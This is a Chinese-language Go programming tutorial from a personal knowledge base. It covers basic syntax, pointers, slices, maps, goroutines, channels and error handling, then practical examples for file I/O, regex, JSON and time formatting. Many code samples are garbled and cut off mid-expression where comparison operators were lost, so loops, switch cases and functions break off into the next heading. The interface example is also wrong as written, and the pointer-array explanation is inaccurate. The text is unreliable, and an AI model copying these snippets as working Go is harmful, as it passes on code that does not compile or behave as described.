是 *int 类型 } 通用格式 package main import ( \"fmt\" ) type structTest struct { name string age int } func main() { a := structTest{ name: \"d4m1ts\", age: 18, } fmt.Printf(\"123 %v 456\\n\", \"aa\") // 123 aa 456 fmt.Printf(\"123 %v 456\\n\", a) // 123 {d4m1ts 18} 456 fmt.Printf(\"123 %+v 456\\n\", a) // 123 {name:d4m1ts age:18} 456 fmt.Printf(\"123 %#v 456\\n\", a) // 123 main.structTest{name:\"d4m1ts\", age:18} 456 } // 通用的格式 %v（对应“值”），这种格式还能打印任意值，甚至包括数组、结构体和映射。 // 当打印结构体时，改进的格式 %+v 会为结构体的每个字段添上字段名，而另一种格式 %#v 将完全按照Go的语法打印值。 条件语句 注意大括号{的位置，不能单独一行！！！ if package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 5){ fmt.Println(name) } } if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else { fmt.Println(\"NONONO\") } } if...else if...else package main import ( \"fmt\" ) func main() { name := \"d4m1ts\" if (len(name) > 10){ fmt.Println(name) } else if (len(name) == 6) { fmt.Println(name, \"==6\") } else { fmt.Println(\"NONONO\") } } switch package main import \"fmt\" func main() { name := \"d4m1ts\" switch { case len(name) > 5: fmt.Print(\">5\") case len(name) select select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。 select 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。 语法: Go 编程语言中 select 语句的语法如下： select { case communication clause : statement(s); case communication clause : statement(s); /* 你可以定义任意数量的 case */ default : /* 可选 */ statement(s); } 以下描述了 select 语句的语法： 每个 case 都必须是一个通信 所有 channel 表达式都会被求值 所有被发送的表达式都会被求值 如果任意某个通信可以进行，它就执行，其他被忽略。 如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。 否则： 如果有 default 子句，则执行该语句。 如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。 实例： package main import \"fmt\" func main() { var c1, c2, c3 chan int var i1, i2 int select { case i1 = 循环语句 for 语法： 共有3种语法，分别是 // 1.和 C 语言的 for 一样 for init; condition; post { } // 2.和 C 的 while 一样 for condition { } // 3.while true，需要手动break for { } init： 一般为赋值表达式，给控制变量赋初值； condition： 关系表达式或逻辑表达式，循环控制条件； post： 一般为赋值表达式，给控制变量增量或减量。 实例： package main import \"fmt\" func main() { sum := 0 // 1 ==> 10 for i:=0; i 40 for sum 160 for { sum += sum if sum > 100{ break } } fmt.Println(sum) } for each 严格来说是 for each range 循环 package main import \"fmt\" func main() { ab := []string {\"aaa\", \"bbb\"} for i,s := range ab{ fmt.Println(i ,s) } } /* 0 aaa 1 bbb */ 无限循环 package main import \"fmt\" func main() { for true { fmt.Println(\"1\") } } 循环控制 就是让循环停止或者跳过此次循环 break 经常用于中断当前 for 循环或跳出 switch 语句 continue 跳过当前循环的剩余语句，然后继续进行下一轮循环。 goto 将控制转移到被标记的语句。 goto见比较少，举个例子吧 package main import \"fmt\" func main() { a := 10 LOOP: for a init函数 每个源文件都可以通过定义自己的无参数 init 函数来设置一些必要的状态。（其实每个文件都可以拥有多个 init 函数。）而它的结束就意味着初始化结束：只有该包中的所有变量声明都通过它们的初始化器求值后 init 才会被调用， 而那些init 只有在所有已导入的包都被初始化后才会被求值。 除了那些不能被表示成声明的初始化外，init 函数还常被用在程序真正开始执行前，检验或校正程序的状态。 package main import \"fmt\" func init() { fmt.Println(\"init ...\") } func main() { fmt.Println(\"main ...\") } /* init ... main ... */ 自定义函数 语法： func function_name( [parameter list] ) [return_types] { 函数体 } 函数定义解析： func：函数由 func 开始声明 function_name：函数名称，参数列表和返回值类型构成了函数签名。 parameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。 return_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。 函数体：函数定义的代码集合。 实例： 选出2个数中最大的 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) int { if a > b { return a } else { return b } } 返回多个值 package main import \"fmt\" func main() { fmt.Println(max(5,9 )) } func max (a int, b int) (int,int) { if a > b { return a,b } else { return b,a } } 引用传递值 传入的是地址，函数内值被修改，函数外也会受影响 package main import \"fmt\" func main() { a := 66 test(&a) fmt.Println(a) } func test(a *int) { fmt.Println(*a) *a += 10 fmt.Println(*a) } /* 66 76 76 */ 构造函数与复合字面 有时零值还不够好，这时就需要一个初始化构造函数，如来自 os 包中的这段代码所示。 func NewFile(fd int, name string) *File { if fd 这里显得代码过于冗长。我们可通过复合字面来简化它， 该表达式在每次求值时都会创建新的实例 func NewFile(fd int, name string) *File { if fd 作用域 局部变量 在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 全局变量 在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用； 全局变量可以在任何函数中使用 全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑 实例： package main import \"fmt\" var global string = \"全局变量\" func main() { fmt.Println(global) } 数组 初始化数组 如果数组长度不确定，可以使用 ... 代替数组的长度，编译器会根据元素个数自行推断数组的长度（也可以使用切片） 初始化数组中 {} 中的元素个数不能大于 [] 中的数字 语法： var variable_name [SIZE] variable_type var balance [10] float32 实例： package main import \"fmt\" func main() { var a [10] string var b = [...] int {1,2,3,4,5} c := [] string {\"aa\", \"bb\", \"cc\"} // 切片 fmt.Println(a) fmt.Println(b) fmt.Println(c) } 访问数组 数组元素可以通过索引（位置）来读取。格式为数组名后加中括号，中括号中为索引的值。 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} fmt.Println(c[0]) for i,s := range c { fmt.Println(i, s) } } 指针 使用指针 会C的指针，这个就很简单了 取地址符是&，放到一个变量前使用就会返回相应变量的内存地址 取值符是*，放到一个内存地址前使用就会返回相应变量的值 package main import \"fmt\" func main() { a := 1 // 实际变量 var ip *int // 指针变量 ip = &a fmt.Println(\"a的值：\", a) fmt.Println(\"a的地址：\", &a) fmt.Printf(\"a的地址：%x\", ip) } 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr package main import \"fmt\" func main() { var ptr *int // 指针变量 fmt.Printf(\"ptr空指针地址：%x\", ptr) } // 0 判断空指针 if(ptr != nil) /* ptr 不是空指针 */ if(ptr == nil) /* ptr 是空指针 */ 指针数组 有一种情况，我们可能需要保存数组，这样我们就需要使用到指针 package main import \"fmt\" func main() { var a = [] int {1,2,3} var ptr [3] *int for i,s := range a { ptr[i] = &s } fmt.Println(ptr) // [0xc000198000 0xc000198000 0xc000198000] for i,s := range ptr { fmt.Println(i, *s) } } ptr 为整型指针数组，因此每个元素都指向了数组中第一个值的地址 结构体 定义结构体 结构体定义需要使用 type 和 struct 语句。struct 语句定义一个新的数据类型，结构体中有一个或多个成员。type 语句设定了结构体的名称。结构体的格式如下： type struct_variable_type struct { member definition member definition ... member definition } 一旦定义了结构体类型，它就能用于变量的声明，语法格式如下： variable_name := structure_variable_type {value1, value2...valuen} // 或 variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen} 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{\"d4m1\", 18} fmt.Println(a) b := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(b) } /* {d4m1 18} {d4m1ts 18} */ 访问成员 如果要访问结构体成员，需要使用点号.操作符，格式为： 结构体.成员名 实例： package main import \"fmt\" func main() { type testStruct struct { name string age int } a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(a.name) } // d4m1ts 结构体作为参数 和其他类型一样，只不过类型是结构体罢了 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} printName(a) } func printName(stru testStruct) { fmt.Println(stru.name) } 结构体指针 也和其他指针一样 实例： package main import \"fmt\" type testStruct struct { name string age int } func main() { a := testStruct{name: \"d4m1ts\", age: 18} fmt.Println(&a) printName(&a) } func printName(stru *testStruct) { fmt.Println(stru.name) } /* &{d4m1ts 18} d4m1ts */ 切片 Go 语言切片是对数组的抽象。 Go 数组的长度不可改变，在特定场景中这样的集合就不太适用，Go 中提供了一种灵活，功能强悍的内置类型切片(\"动态数组\")，与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。 定义切片 可以声明一个未指定大小的数组来定义切片，切片不需要说明长度 var identifier []type 或使用 make() 函数来创建切片: var slice1 []type = make([]type, len) // 也可以简写为 slice1 := make([]type, len) 也可以指定容量，其中 capacity 为可选参数。 make([]T, length, capacity) 这里 len 是数组的长度并且也是切片的初始长度。 实例： package main import \"fmt\" func main() { var slice1 []int fmt.Println(slice1) // [] var slice2 []int = make([]int, 10) fmt.Println(slice2) // [0 0 0 0 0 0 0 0 0 0] } 初始化切片 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(s1) // [1 2 3 4 5] // 使用数组来初始化切片 d1 := [10]int {1,3,5,7,9} fmt.Println(d1) // [1 3 5 7 9 0 0 0 0 0] s2 := d1[:] fmt.Println(s2) // [1 3 5 7 9 0 0 0 0 0] s3 := d1[2:] fmt.Println(s3) // [5 7 9 0 0 0 0 0] } 空(nil)切片 一个切片在未初始化之前默认为 nil，长度为 0 package main import \"fmt\" func main() { var s1 []int fmt.Println(s1) // [] fmt.Println(s1 == nil) // true } 切片截取 和python一样，array[start:end]截取即可 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} fmt.Println(s1[2:4]) // [3 4] } len()和cap()函数 切片是可索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法cap()可以测量切片最长可以达到多少。 package main import \"fmt\" func main() { s1 := []int {1,2,3,4,5} fmt.Println(len(s1)) // 5 fmt.Println(cap(s1)) // 5 } 追加元素 通过append函数可以追加元素 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") fmt.Println(c) // [aa bb cc dd ee] } 如果想合并2个切片，也可以使用append 注意的是要添加...，如果没有 ...，它就会由于类型错误而无法编译 package main import \"fmt\" func main() { c := [] string {\"aa\", \"bb\", \"cc\"} c = append(c, \"dd\", \"ee\") x := [] string {\"1\",\"2\",\"3\"} c = append(c, x...) fmt.Println(c) // [aa bb cc dd ee 1 2 3] } append()和copy()函数 如果想增加切片的容量，我们必须创建一个新的更大的切片并把原分片的内容都拷贝过来。 下面的代码描述了从拷贝切片的 copy 方法和向切片追加新元素的 append 方法。 package main import \"fmt\" func main() { var s1 = []int {1,2,3,4,5} s1 = append(s1, 666) // [1 2 3 4 5 666] s1 = append(s1, 7,8,9) // [1 2 3 4 5 666 7 8 9] fmt.Println(s1) s2 := make([]int, len(s1)*2, cap(s1)*2) copy(s2, s1) // 把s1的内容复制给s2 fmt.Println(s2) // [1 2 3 4 5 666 7 8 9 0 0 0 0 0 0 0 0 0] } 集合(Map) Map 是一种无序的键值对的集合。Map 最重要的一点是通过 key 来快速检索数据，key 类似于索引，指向数据的值。 Map 是一种集合，所以我们可以像迭代数组和切片那样迭代它。不过，Map 是无序的，我们无法决定它的返回顺序，这是因为 Map 是使用 hash 表来实现的。 定义Map 可以使用内建函数 make 也可以使用 map 关键字来定义 Map: /* 声明变量，默认 map 是 nil */ var map_variable map[key_data_type]value_data_type /* 使用 make 函数 */ map_variable := make(map[key_data_type]value_data_type) 实例： package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" fmt.Println(m1) // 2.使用make创建 m2 := make(map[string]string) m2 [\"e\"] = \"f\" fmt.Println(m2) } 删除元素 delete()函数用于删除集合的元素, 参数为map和其对应的key package main import \"fmt\" func main() { // 1.直接使用map创建 m1 := map[string]string{ \"a\": \"test1\", \"b\": \"test2\", } m1 [\"c\"] = \"test3\" delete(m1, \"a\") fmt.Println(m1) // map[b:test2 c:test3] } 范围(Range) range 关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。在数组和切片中它返回元素的索引和索引对应的值，在集合中返回 key-value 对 package main import \"fmt\" func main() { // 遍历切片 var s1 = []int {1,2,3,4,5} sum := 0 for _,num := range s1 { // _空白符，表示被舍弃的变量，这里的变量是索引 sum += num } fmt.Println(sum) // 遍历map m1 := map[string]string{ \"a\":\"test1\", \"b\":\"test2\", } for k,v := range m1 { fmt.Println(k, v) } } 类型转换 类型转换用于将一种数据类型的变量转换为另外一种类型的变量 语法： type_name为类型，expression为表达式 type_name(expression) 实例： package main import \"fmt\" func main() { a := 1 fmt.Println(string(a)) // 空 fmt.Println(float32(a)) // 1 } 递归 递归，就是在运行的过程中调用自己 阶乘实例 package main import \"fmt\" func Factorial(n uint64)(result uint64) { if (n > 0) { result = n * Factorial(n-1) return result } return 1 } func main() { var i int = 15 fmt.Printf(\"%d 的阶乘是 %d\\n\", i, Factorial(uint64(i))) } // 15 的阶乘是 1307674368000 斐波那契数列实例 package main import \"fmt\" func fibonacci(n int) int { if n 接口 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口 和其他语言如java的接口一样 声明接口 type interface_name interface { method_name1([args ...arg_type]) [return_type] method_name2([args ...arg_type]) [return_type] method_name3([args ...arg_type]) [return_type] ... method_namen([args ...arg_type]) [return_type] } 一个接口中可以定义多个方法，根据逻辑需要，自定义参数和返回值。 实现接口 一个结构体实现了某个接口的所有方法，则此结构体就实现了该接口。 实例： package main import \"fmt\" // 定义接口 type testImpl interface { testFunc1(a int, b int) } // 定义结构体 type testStruct struct { } // 实现函数 func (testMethod testStruct) TestFunc1(a int, b int) int { return a+b } // 调用函数 func main() { test := testStruct{} // 实例化方法1 res := test.TestFunc1(10,20) fmt.Println(res) test1 := new(testStruct) // 实例化方法2 res1 := test1.TestFunc1(10,20) fmt.Println(res1) } new和make Go提供了两种分配原语，即内建函数 new 和 make。 它们所做的事情不同，所应用的类型也不同。它们可能会引起混淆，但规则却很简单。 new 这是个用来分配内存的内建函数，但与其它语言中的同名函数不同，它不会初始化内存，只会将内存置零。也就是说，new(T) 会为类型为 T 的新项分配已置零的内存空间，并返回它的地址，也就是一个类型为 *T 的值。 它返回一个指针，该指针指向新分配的，类型为T的零值 实例： package main import ( \"fmt\" ) func main() { type test struct { a int b int } p := new(test) fmt.Println(p) // &{0 0} fmt.Println(*p) // {0 0} } make 内建函数 make(T, args) 的目的不同于 new(T)，它只用于创建切片、映射和信道，并返回类型为 T（而非 *T）的一个已初始化（而非置零）的值。 注意：make只适用于映射、切片和信道且不返回指针。若要获得明确的指针，请使用new分配内存。 defer defer 语句用于预设一个函数调用（即推迟执行函数）， 该函数会在执行 defer 的函数返回之前立即执行。它显得非比寻常， 但却是处理一些事情的有效方式，例如无论以何种路径返回，都必须释放资源的函数。 典型的例子就是解锁互斥和关闭文件。 被推迟函数的实参（如果该函数为方法则还包括接收者）在推迟执行时就会求值， 而不是在调用执行时才求值。这样不仅无需担心变量值在函数执行时被改变， 同时还意味着单个已推迟的调用可推迟多个函数的执行。 实例： 被推迟的函数按照后进先出（LIFO）的顺序执行，因此以上代码在函数返回时会打印 4 3 2 1 0 package main import ( \"fmt\" ) func main() { for i := 0; i 并发 go程 称之为Go程是因为现有的术语—线程、协程、进程等等—无法准确传达它的含义。 Go程具有简单的模型：它是与其它Go程并发运行在同一地址空间的函数。它是轻量级的，所有消耗几乎就只有栈空间的分配；而且栈最开始是非常小的，所以它们很廉价，仅在需要时才会随着堆空间的分配（和释放）而变化。 Go语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。 goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 语法： go 函数名( 参数列表 ) Go 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间 实例： package main import ( \"fmt\" \"time\" ) func loop() { i := 1 for i 执行代码后，输出结果为1 1 1 2 2 2 3 3 3 ...，因为是3个goroutine在同时执行 通道（channel） 通道（channel，也叫信道）是用来传递数据的一个数据结构。 主要是获取并发的每个函数返回的数据 通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 ch 声明一个通使用chan关键字即可，通道在使用前必须先创建： ch := make(chan int) 实例： package main import \"fmt\" // 计算和 func loop(res chan int) { i := 1 sum := 0 for i 通道缓冲区 通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小 ch := make(chan int, 100) 带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。 注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 实例： package main import \"fmt\" // 计算所有通道的和 func loop(res chan int) { i := 1 for i 注意事项 接收者在收到数据前会一直阻塞。若信道是不带缓冲的，那么在接收者收到值前，发送者会一直阻塞；若信道是带缓冲的，则发送者仅在值被复制到缓冲区前阻塞；若缓冲区已满，发送者会一直等待直到某个接收者取出一个值为止。 遍历通道 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片 实例： package main import \"fmt\" func loop(res chan int) { i := 1 for i 关闭通道 如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭 package main import \"fmt\" func loop(res chan int) { i := 1 for i 异常处理 在异常处理方面，Go语言不像其他语言，使用try..catch.. finall...， 而使用defer, panic, recover，将异常和控制流程区分开。即通过panic抛出异常，然后在defer中，通过recover捕获这个异常，最后处理。 但是更加推荐的错误处理方法： Golang中我们通常会在函数或方法中返回error结构对象来判断是否有异常出现，并且可以更具需要自定义各种类型的error。如果返回的 error 值为 nil，则表示未遇到错误，否则 error 会返回一个字符串，用于说明遇到了什么错误。 error类型是一个接口类型，自定义的错误类型必须实现Error()方法，这是它的定义： type error interface { Error() string } 生成error 1、原生New方法，将字符串 text 包装成一个 error 对象返回 func New(text string) error { return &errorString{text} } //例如 errorIns := errors.New(\"test content\") fmt.Println(errorIns) 2、定义自己的错误 package main import ( \"fmt\" \"time\" ) // 定义结构体 type MyError struct { When time.Time What string } // 实现error接口中的方法 func (e MyError) Error() string { return fmt.Sprintf(\"%v: %v\", e.When, e.What) } // 编写异常函数 func oops() error { return MyError{ time.Date(1989, 3, 15, 22, 30, 0, 0, time.UTC), \"the file system has gone away\", } } func main() { if err := oops(); err != nil { fmt.Println(err) } } Panic异常 向调用者报告错误的一般方式就是将 error 作为额外的值返回；但是这种情况下程序不会退出，如果我们遇到了出现异常就必须停止程序的情况，就会使用到panic Go提供了内建的 panic 函数 它会产生一个运行时错误并终止程序 该函数接受一个任意类型的实参（一般为字符串），并在程序终止时打印 它还能表明发生了意料之外的事情，比如从无限循环中退出了 package main import \"fmt\" func main() { panic(\"sth error !!!\") fmt.Println(\"hello world\") } /* panic: sth error !!! goroutine 1 [running]: main.main() /Users/d4m1ts/go/src/goTest/Hello.go:6 +0x39 */ 因为会直接停止整个程序，所以实际的库函数应避免 panic，若问题可以被屏蔽或解决， 最好就是让程序继续运行而不是终止整个程序 恢复 当 panic 被调用后（包括不明确的运行时错误，例如切片检索越界或类型断言失败）， 程序将立刻终止当前函数的执行，并开始回溯Go程的栈，运行任何被推迟（defer）的函数。 若回溯到达Go程栈的顶端，程序就会终止。不过我们可以用内建的 recover 函数来重新或来取回Go程的控制权限并使其恢复正常执行。 实例： package main import ( \"fmt\" \"time\" ) func loop(a int){ defer func() { // 触发panic异常就会调用这个推迟函数 if err := recover(); err != nil { // recover函数恢复 fmt.Println(\"loop error: \", err) } }() if a > 3{ panic(\"erro a > 3\") } else { fmt.Println(\"normal: \", a) } } func main() { i := 0 for i 3 normal: 3 */ 通过恰当地使用恢复模式，do 函数（及其调用的任何代码）可通过调用 panic 来避免更坏的结果。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-14 12:56:07 "},"个人知识库/03.编程开发/GO/02.GO实例/01.GO常用基础实例.html":{"url":"个人知识库/03.编程开发/GO/02.GO实例/01.GO常用基础实例.html","title":"01.GO常用基础实例","keywords":"","body":" 介绍 读文件 按字节读取文件 借助ioutil来读取 仅使用ioutil包来完成读取操作 利用Scanner按行读取 写文件 使用ioutil 通过File句柄 通过bufio包 正则表达式 匹配内容是否存在 提取内容 替换内容 其他 JSON序列化和反序列化 标准JSON模块 更优的jsoniter 扩展 时间日期 随机数 伪随机数 真随机数 URL解析 Base64 命令行参数 执行系统命令 只执行命令，不获取结果 执行命令获取结果 执行命令获取结果并区分stdout和stderr 多条命令使用管道执行 扩展 HTTP请求 快速发起get请求 带有参数的GET请求 返回JSON的数据包 自定义Header头 快速发起POST请求 自定义POST请求 忽略证书 cookieJar和代理设置 gzip解压 go flag 颜色输出 参考 介绍 记录一些可能常用到的实例，便于快速查询 读文件 按字节读取文件 这种方式是以字节为单位来读取，相对底层一些，代码量也较大 package main import ( \"fmt\" \"io\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() buf := make([]byte, 1024) // 每次读取1024字节 var res string // 存放最终的结果 for { count, err := file.Read(buf) if err == io.EOF { // 检测是否到结尾 break } else { currBytes := buf[:count] // 读取了count字节 res += string(currBytes) // 最终结果 } } fmt.Println(res) } 借助ioutil来读取 由于 os.File 也是 io.Reader 的实现，我们可以调用 ioutil.ReadAll(io.Reader) 方法，将文件所有字节读取出来，省去了使用字节缓存循环读取的过程。 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() byteRes, _ := ioutil.ReadAll(file) // 返回存放结果的切片 fmt.Printf(\"%T\\n\", byteRes) // []uint8 fmt.Println(string(byteRes)) } 仅使用ioutil包来完成读取操作 为了进一步简化文件读取操作，ioutil 还提供了 ioutil.ReadFile(filename string) 方法，一行代码搞定读取任务 package main import ( \"fmt\" \"io/ioutil\" ) func main() { data, _ := ioutil.ReadFile(\"test.txt\") fmt.Println(string(data)) } 利用Scanner按行读取 逐行读取文件内容，这个时候可以 Scanner 来完成 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file, _ := os.Open(\"test.txt\") defer file.Close() scanner := bufio.NewScanner(file) // 类似Java中的Scanner for scanner.Scan() { fmt.Println(scanner.Text()) } } 写文件 使用ioutil 刚才用到了ioutil.ReadFile，与之对应的，肯定也有WriteFile 该函数属于全覆盖写入，如果文件不存在，则会根据指定的权限创建文件，如果存在，则会先清空文件原有内容，然后再写入新数据 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { data := []byte(\"hello d4m1ts\") fmt.Println(os.FileMode(0666).String()) // -rw-rw-rw- ioutil.WriteFile(\"test.txt\", data, 0666) } 通过File句柄 os.OpenFile(name string, flag int, perm FileMode)方法，通过指定额外的 读写方式 和 文件权限 参数，使文件操作变得更为灵活。 flag 有以下几种常用的值： os.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件 package main import ( \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) // 按照特定权限打开 defer file.Close() data := []byte(\"hello d4m1ts\") count, _ := file.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = file.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) file.Sync() // 确保写入到磁盘 } 通过bufio包 这种方式其实是在File句柄上做了一层封装，调用方式和上面直接写入非常相似 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) defer file.Close() writer := bufio.NewWriter(file) data := []byte(\"hello d4m1ts\") count, _ := writer.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = writer.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) writer.Flush() // 清空缓存，确保写入到磁盘 } 正则表达式 匹配内容是否存在 package main import ( \"fmt\" \"regexp\" ) func main() { regex := \"\\\\d{1,3}\" res, _ := regexp.MatchString(regex, \"123123\") res1, _ := regexp.MatchString(regex, \"aaaa\") fmt.Println(res) // true fmt.Println(res1) // false } 提取内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.MatchString(\"123123123123\")) // true fmt.Println(regex.FindString(\"123213123123\")) // 123213 返回第一个匹配的 fmt.Println(regex.FindStringIndex(\"123213123123\")) // [0 6] 返回第一个匹配的开始和结尾的索引 fmt.Println(regex.FindStringSubmatch(\"123213123123\")) // [123213 123] 返回包括()这种子匹配的 fmt.Println(regex.FindAllString(\"123213123123\",-1)) // [123213 123123] 返回匹配的所有内容，n表示为返回个数，-1则返回全部 fmt.Println(regex.FindAllStringSubmatch(\"123213123123\",-1)) // [[123213 123] [123123 123]] 同时返回子匹配的结果 fmt.Println(regex.FindAll([]byte(\"123123123123\"), -1)) // [[49 50 51 49 50 51] [49 50 51 49 50 51]] 通过字节去匹配，返回的也是字节的结果 } 替换内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.ReplaceAllString(\"123123123213\",\"a\")) // aa } 其他 在线正则表达式测试网站：https://regex101.com/ golang正则匹配的时候，.默认是不匹配换行的，所以要匹配多行数据就容易出问题 这个时候可以采用如下格式，让.也可以匹配换行 (?s).* 实例： JSON序列化和反序列化 标准JSON模块 Go 语言标准库 encoding/json 提供了操作 JSON 的方法，一般可以使用 json.Marshal 和 json.Unmarshal 来序列化和解析 JSON 字符串 实例一： package main import ( \"encoding/json\" \"fmt\" ) func main() { // 序列化 s1 := []string{\"apple\", \"peach\", \"pear\"} s2, _ := json.Marshal(s1) // 转字符串 fmt.Println(string(s2)) // [\"apple\",\"peach\",\"pear\"] // 反序列化 var s3 [] string json.Unmarshal([]byte(s2), &s3) // 字符串恢复 fmt.Println(s3) // [apple peach pear] fmt.Println(len(s3), s3[0]) // 3 apple } 实例二： package main import ( \"encoding/json\" \"fmt\" ) // 定义结构体，变量名注意大写，因为跨到json包了 type User struct { Name string Age int } func main() { // 初始化结构体 user := User{ Name: \"d4m1ts\", Age: 18, } // 序列化，转字符串 s1, _ := json.Marshal(user) fmt.Println(string(s1)) // 反序列化，恢复为原来的结构 user2 := User{} json.Unmarshal(s1, &user2) fmt.Println(user2) } 更优的jsoniter 标准库 encoding/json 在使用时需要预先定义结构体，使用时显得不够灵活。这时候可以尝试使用 github.com/json-iterator/go 模块，其除了提供与标准库一样的接口之外，还提供了一系列更加灵活的操作方法。 go get -v github.com/json-iterator/go package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" ) func main() { // 反序列化，恢复为原来的结构 s := `{\"a\":\"b\", \"c\":[\"d\",\"e\",\"f\"]}` res := jsoniter.Get([]byte(s), \"c\") fmt.Println(res.ToString()) // [\"d\",\"e\",\"f\"] 只解析\"c\"的内容部分 } 扩展 大多数时候获取的json数据可能是映射+切片形式的，只有上面的一些内容很难搞，所以还是补充一下 使用.GetInterface()会自动给结果转换为interface{}，再通过这个结果继续转换，如[]interface{} 想要拿到最后的数据，只需要通过数据.(对应的格式)即可，如 aaa.(string)表示转换为string [!note] 一步一步看吧，用.GetInterface()或者等报错提示，就可以看到应该转换的格式了，如下图右边就是可以转换的格式 func main() { strings := \"{\\\"a\\\":[{\\\"b\\\":\\\"c\\\"}]}\" var res interface{} res = jsoniter.Get([]byte(strings), \"a\").GetInterface() fmt.Println(res.([]interface{})) for _,i := range res.([]interface{}) { fmt.Println(i.(map[string]interface{})) } } 时间日期 package main import ( \"fmt\" \"time\" ) func main() { p := fmt.Println // 现在的时间 now := time.Now() p(now) // 休眠1秒 time.Sleep(time.Second * 1) p(time.Now()) // 现在的时间 // 格式类型转换 t1, _ := time.Parse(time.RFC3339, \"2012-11-01T22:08:41+00:00\") p(t1) // 2012-11-01 22:08:41 +0000 +0000 // 格式化输出 p(now.Format(\"3:04PM\")) // 5:14PM p(now.Format(\"Mon Jan _2 15:04:05 2006\")) // Tue Dec 28 17:15:49 2021 p(now.Format(\"2006-01-02T15:04:05.999999-07:00\")) // 2021-12-28T17:15:49.121777+08:00 p(now.Format(time.RFC850)) // Tuesday, 28-Dec-21 17:20:02 CST fmt.Printf(\"%d-%02d-%02dT%02d:%02d:%02d-00:00\\n\", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()) // 2021-12-28T17:20:02-00:00 } 随机数 伪随机数 Go的math/rand包提供伪随机数生成。例如，rand.Intn返回一个随机int n，0 。 